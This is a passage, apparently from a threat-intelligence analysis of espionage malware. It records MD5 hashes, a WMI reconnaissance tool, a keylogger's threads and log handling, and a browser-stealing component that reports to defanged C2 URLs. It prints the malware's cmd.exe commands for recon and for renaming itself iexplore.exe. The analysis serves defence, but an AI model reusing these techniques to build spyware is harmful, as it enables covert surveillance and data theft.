fails.\n\n|MD5|Compilation date|Linker version|\n|---|---|---|\n|83a1634f660d22b990b0a82b1185de5b|1992.06.19 22:22:17 (GMT)|2.25|\n\n\n-----\n\n## Bi tool\n\nKnown variants:\n\n**MD5** **Compilation date** **Linker version**\n\ncd56d04639dd395a035bc2a2e11f5d3d 2012.10.25 06:03:21 (GMT) 10.0\n\nThe file is a PE EXE file created in Microsoft Visual C++ 2010.\n\nIt is a tool designed to collect information about the operating system and BIOS via WMI.\n\n## Main\n\nThe module concatenates a string to run a command with cmd.exe:\n\n**cmd.exe /c wmic os get /format:HFORM > %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll155.html**\n\n**&& wmic bios list /format:HFORM >> %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll155.html**\n\nExecution of the commands above concatenates two HTML reports which contain two tables with information about running\nOS and computer’s BIOS.

After that the process is restarted from ExePath.\n\nIf installation to the system is completed, the application starts three threads:\n\nThread #1 (Selfremover)\n\nThis thread creates a system event object called “__klgkillsoft__” and waits for this event to be activated. When something\nactivates this event the thread removes the LNK file from Startup folder and renames current executable from WcfAudit.exe to\nfile with a decimal number in the name and no extension. The decimal number represents system tick counter value.\n\nThread#2 (Keylogger)\n\nThis thread sets low level Windows keyboard hook, which allows the module to intercept keystrokes. The thread records all\nkeystrokes, foreground window names and textual clipboard data.\n\nAccumulated data is available for the Thread#3 which expects it in special buffer.\n\n|MD5|Compilation date|Linker version|\n|---|---|---|\n|b3258020b9ab53a1635da844aed955ea|2013.01.28 11:14:47 (GMT)|10.0|\n\n\n-----\n\nThread#3 (Logger)\n\nThis thread is started 30 seconds after Thread#2. It checks if XmlPath file referred above exists. If it exists it is moved to\nLogPath directory, the name is changed to klg<Number>.klg, where Number is a decimal integer taken from current system\ntick counter value. Then this file is opened and appended with new data received from Keylogger thread. Please note, that at\nleast empty file at XmlPath must be created, the keylogger starts saving collected data only if it finds file at XmlPath.\n\nIf the LogPath directory doesn’t exist, it will be created.\n\nIf the klg<Number>.klg file becomes larger than 1Mb, new file at XmlPath is created and moved back to LogPath directory\nwith new name klg<Number>.klg (current tick counter value is used). In the end LogPath directory is full of klg<Number>.klg\nfiles, however there is a bug in this logics. If the system is rebooted it will not contains XmlPath will not exist and that means\nthat keylogger will not be active. However it can still be activated any time by creating the XmlPath file.\n\nThe logs are stored in plaintext.

First,\nit concats the string and copies itself to \"C:\\Documents and Settings\\All Users\\Application Data\\a-t_name.exe\". Then, it uses\nscript commands to apply hidden attributes and further copy itself:\n\n**cmd.exe /c cd C:\\Documents and Settings\\All Users\\Application Data && attrib -H /s a-t_name.exe && rename a-**\n**t_name.exe ie.exe\"**\n\n**cmd.exe /c cd C:\\Documents and Settings\\All Users\\Application Data && rename ie.exe iexplore.exe\"**\n\nThis process immediately communicates with its hardcoded C2 at hxxp://www.politnews.org/dd_4.php and\nhxxp://www.bannetwork.org/dd_4.php, registering a unique identifier with its C2. It enumerates through process windows,\nlooking for Internet Explorer processes and subclasses the window to steal all web browsing content and write it to\nc:\\documents and settings\\All Users\\Application Data\\sys32dll.txt, encrypting the data and sending stolen data back to the C2.\n\n\n-----",
